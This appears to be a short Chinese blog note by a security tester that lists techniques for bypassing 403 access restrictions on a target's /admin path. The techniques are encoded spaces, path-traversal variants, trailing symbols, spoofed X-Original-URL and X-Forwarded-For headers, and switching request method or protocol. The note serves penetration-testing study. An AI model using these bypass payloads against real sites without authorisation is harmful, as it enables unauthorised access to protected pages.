​ 平时我们做安全测试的时候可能会经常遇到403页面，按常规的思路无非就是扫目录，扫扫文件。我也曾用这种暴力的方式发现了不少的漏洞。

​ 前些天逛推特的时候看到还可以用如下的方式去绕过页面权限控制，特此学习记录一番。

Bypass 403

eg : target.com/admin → 403

（1）使用空格符绕过(From Hack3rScr0lls)

  • target.com/admin%20 → 200
  • target.com/admin%09 → 200

（2）使用路径遍历绕过(From Hack3rScr0lls)

  • target.com/admin/..;/ → 200
  • target.com/static../admin.jsp → 200
  • target.com/%2e/admin/ → 200

（3）添加干扰符号

  • target.com/admin/ → 200
  • target.com/admin# → 200
  • target.com/admin/. → 200
  • target.com//admin// → 200
  • target.com/./admin/./ → 200
  • target.com/admin.json → 200
  • target.com/admin.svg → 200
  • target.com/admin/anything → 200
  • target.com/admin/?anything → 200

（4）添加X-Rewrite-URL头

（5）添加X-Real-IP和X-Forwarded-For头

（6）添加X-Original-URL头（From jae_hak99）

（7）改变请求方法

  • Get（403） -> Post（200）
  • Post （403）-> Get（200）

（8）改变请求协议

  • Https（403） -> Http（200）
  • Http（403） -> Https（200）
